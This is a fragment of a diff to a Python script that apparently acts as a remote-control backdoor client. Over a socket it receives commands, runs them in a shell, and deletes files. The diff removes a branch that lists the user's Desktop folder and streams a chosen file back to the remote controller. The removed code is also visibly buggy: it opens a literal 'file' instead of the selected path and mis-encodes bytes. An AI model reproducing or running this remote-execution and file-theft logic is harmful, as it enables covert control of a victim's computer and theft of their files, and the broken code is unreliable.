@@ -111,25 +111,6 @@ while (True):
             #might not need shell and stdout
             subprocess.run(command, stdout=subprocess.PIPE, shell=True)
             s.sendall(bytes("File Deleted", "utf-8"))
-    elif decodedMsg == "SendFiles-Desktop":
-        dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
-        command = dir + "&& dir"
-        result = subprocess.run(command , stdout=subprocess.PIPE, shell=True)
-        s.sendall(bytes(result.stdout.decode(), "utf-8"))
-        msg = s.recv(1024)
-        decodedMsg = msg.decode("utf-8")
-        if decodedMsg == "cancel":
-            s.sendall(bytes("cancelled", "utf-8"))
-
-        else:
-            file = command+ decodedMsg
-            f = open("file", "rb")
-            message = f.read(1024)
-            while message:
-                s.sendall(bytes(message, "utf-8"))
-                message = f.read(1024)
-            s.sendall(bytes("done sending","utf-8"))
-            f.close()
 
 
 
